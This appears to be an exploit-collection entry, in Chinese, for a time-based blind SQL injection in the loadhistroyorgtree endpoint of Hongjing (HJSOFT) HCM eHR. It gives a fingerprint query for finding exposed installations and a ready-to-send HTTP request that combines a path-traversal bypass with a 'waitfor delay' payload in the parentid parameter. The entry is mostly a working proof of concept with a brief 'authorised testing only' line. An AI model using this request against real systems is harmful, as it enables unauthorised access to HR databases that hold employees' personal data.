---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM loadhistroyorgtree SQL注入漏洞

## 漏洞描述

宏景HCM `/w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree` 接口 `parentid` 参数存在 SQL 注入漏洞（延时盲注）。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3Bwaitfor/**/+delay/**/+%270%3A0%3A3%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target=1 HTTP/1.1
```

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
